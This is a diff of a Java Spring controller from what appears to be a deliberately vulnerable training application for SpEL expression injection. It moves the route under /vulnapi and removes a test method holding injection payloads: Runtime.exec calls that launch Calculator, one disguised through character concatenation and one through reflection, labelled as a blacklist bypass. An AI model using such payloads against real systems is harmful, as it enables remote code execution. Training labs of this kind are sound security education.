@@ -29,7 +29,7 @@ import java.util.regex.Pattern;
 
 @Api("Spring 表达式注入")
 @RestController
-@RequestMapping("/SPEL")
+@RequestMapping("/vulnapi/SPEL")
 public class SpEL {
     Logger log = LoggerFactory.getLogger(SpEL.class);
 
@@ -77,30 +77,5 @@ public class SpEL {
         log.info("[safe] SpEL");
         return result;
     }
-
-
-    /**
-     * 本地测试
-     */
-    public static void main(String[] args) {
-        // 算数运算
-        String ex1 = "100*2";
-
-        // 对象实例化
-        String ex2 = "new java.util.Date().getTime()";
-        String ex3 = "new java.lang.String('hello')";
-
-        // T(Type): 使用"T(Type)"来表示java.lang.Class实例，同样，只有java.lang 下的类才可以省略包名
-        String ex4 = "T(java.lang.Runtime).getRuntime().exec('open -a Calculator')";
-        String ex5 = "T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(111).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(114)))";
-
-        // 利用反射绕过黑名单过滤
-        String ex6 = "T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]{\"open\",\"-a\",\"Calculator\"})";
-
-        ExpressionParser parser = new SpelExpressionParser();
-        Expression exp = parser.parseExpression(ex3);
-        System.out.println(exp.getValue());
-    }
-
 
 }
